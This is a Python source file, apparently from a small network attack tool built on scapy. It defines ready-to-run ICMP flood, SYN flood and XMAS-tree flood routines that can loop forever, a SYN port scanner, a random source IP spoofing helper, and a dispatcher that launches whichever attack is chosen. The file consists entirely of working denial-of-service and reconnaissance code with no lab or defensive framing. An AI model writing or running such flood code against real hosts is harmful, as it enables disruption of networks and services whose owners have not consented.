from Constants import constants
from Constants.constants import *
from Constants.errorconstants import *
import random
from scapy.layers.inet import TCP, IP, ICMP
from scapy.sendrecv import sr1, send
from scapy.volatile import RandIP
import sys


class Attack:
    def __init__(self):
        pass

    @staticmethod
    def icmp_flood(target_ip: str, num_of_pkts: int):
        # Initialize
        print(ICMP_FLOOD_INIT_MSG + f"[IP: {target_ip}]")

        # Make packet
        ip_header = IP(dst=target_ip)
        icmp = ICMP()
        packet = ip_header / icmp

        # Send ICMP Packets
        _send_icmp_flood(packet, num_of_pkts)

    @staticmethod
    def port_scan(target_ip: str, src_ip: str, min_port: int, max_port: int):
        print(PORT_SCAN_INIT_MSG)

        # Initialize Variables
        min_port, max_port = _port_scan_helper(min_port, max_port)
        counter = ZERO

        # src_ip = _source_ip_spoofer(source_ip=src_ip)

        print(f"[+] Now scanning target IP [{target_ip}] for the following"
              f" [ports {min_port}-{max_port}]...")

        for port in range(min_port, max_port):
            # a) Make Packet
            ip_header, packet = _port_scan_make_packet(port, target_ip)

            # b) Send Packet and Wait for Response Packet
            response = sr1(packet, timeout=RESPONSE_TIMEOUT, verbose=ZERO)
            if response and response.haslayer(TCP) and response.getlayer(TCP).flags == SYN_ACK_HEX:
                counter += 1
                print(f"[+] SCAN SUCCESS: Port {port} is open!")

        _port_scan_print_results(counter, min_port, max_port)

    @staticmethod
    def syn_flood(target_ip: str, port: int, num_of_pkts: int):
        # Initialize
        print(SYN_FLOOD_INIT_MSG + f"[IP: {target_ip}]")

        # Randomize port if not provided in command-line args
        target_port = _port_randomizer(port)

        # Make packet
        ip_header = IP(dst=target_ip)
        tcp_header = TCP(dport=target_port, flags=SYN)
        packet = ip_header / tcp_header

        # Send SYN packets in flood
        _send_syn_flood(num_of_pkts, packet)

        print(WELCOME_DECORATION)

    @staticmethod
    def xmas_tree(target_ip: str, port: int, num_of_pkts: int):
        # Initialize
        print(XMAS_TREE_INIT_MSG + f"[IP: {target_ip}]")

        # Randomize port if not provided in command-line args
        target_port = _port_randomizer(port)

        # Make packet
        ip_header = IP(dst=target_ip)
        tcp_header = TCP(dport=target_port, flags=ALL_FLAGS)
        packet = ip_header / tcp_header

        # Send XMAS tree packets
        _send_xmas_tree_flood(num_of_pkts, packet)
        print(WELCOME_DECORATION)

    @staticmethod
    def launch_attack(attack: str, dest_ip: str, port: int,
                      source_ip: str, number_of_packets: int,
                      min_port: int, max_port: int):

        match attack:
            case constants.PORT_SCAN:
                Attack.port_scan(target_ip=dest_ip, src_ip=source_ip,
                                 min_port=min_port, max_port=max_port)
            case constants.SYN_FLOOD:
                Attack.syn_flood(target_ip=dest_ip, port=port,
                                 num_of_pkts=number_of_packets)
            case constants.XMAS_TREE:
                Attack.xmas_tree(target_ip=dest_ip, port=port,
                                 num_of_pkts=number_of_packets)
            case constants.ICMP_FLOOD:
                Attack.icmp_flood(target_ip=dest_ip, num_of_pkts=number_of_packets)


####################################|| ATTACK HELPER FUNCTIONS ||####################################
def _port_scan_helper(min_port, max_port):
    if min_port == ZERO:
        sys.exit(MIN_PORT_NOT_SPECIFIED_MSG)
    if max_port == ZERO:
        sys.exit(MAX_PORT_NOT_SPECIFIED_MSG)
    if max_port < min_port:
        sys.exit(MAX_PORT_LESS_THAN_MIN_ERROR_MSG)
    if max_port == min_port:
        max_port += 1

    return min_port, max_port


def _port_scan_make_packet(port, target_ip):
    ip_header = IP(dst=target_ip)
    tcp_header = TCP(dport=port, flags=SYN)
    packet = ip_header / tcp_header
    return ip_header, packet


def _port_scan_print_results(count, min_port, max_port):
    if count is not ZERO:
        print(f"[+] PORT SCAN COMPLETE: {count} ports are currently open!")
    else:
        print(f"[+] PORT SCAN COMPLETE: There are currently no ports open from ports "
              f"{min_port}-{max_port}!")

    print(WELCOME_DECORATION)


def _source_ip_spoofer(source_ip):
    if source_ip == "" or not source_ip:
        print(SPOOF_SOURCE_IP_MSG)
        source_ip = str(RandIP())
        print(SPOOF_SOURCE_IP_FINAL_MSG + source_ip)

    return source_ip


def _send_icmp_flood(packet, num_of_pkts):
    if num_of_pkts is ZERO:
        print(ICMP_FLOOD_STOP_MSG)
        send(packet, loop=1)
        print(ICMP_FLOOD_COMPLETE_FORCE_MSG)
    else:
        send(packet, loop=1, count=num_of_pkts)
        print(ICMP_FLOOD_COMPLETE_MSG)


def _send_syn_flood(num_of_pkts, packet):
    if num_of_pkts is ZERO:
        print(SYN_FLOOD_STOP_MSG)
        send(packet, loop=1)
        print(SYN_FLOOD_COMPLETE_FORCE_MSG)
    else:
        send(packet, loop=1, count=num_of_pkts)
        print(SYN_FLOOD_COMPLETE_MSG)


def _send_xmas_tree_flood(num_of_pkts, packet):
    if num_of_pkts is ZERO:
        print(XMAS_TREE_STOP_MSG)
        send(packet, loop=1)
        print(XMAS_TREE_COMPLETE_FORCE_MSG)
    else:
        send(packet, loop=1, count=num_of_pkts)
        print(XMAS_TREE_COMPLETE_MSG)


def _port_randomizer(port: int):
    if port is ZERO:
        print(RANDOMIZE_PORT_MSG)
        port = random.randint(MIN_PORT, MAX_PORT)
        print(RANDOMIZE_FINAL_MSG + str(port))

    return port
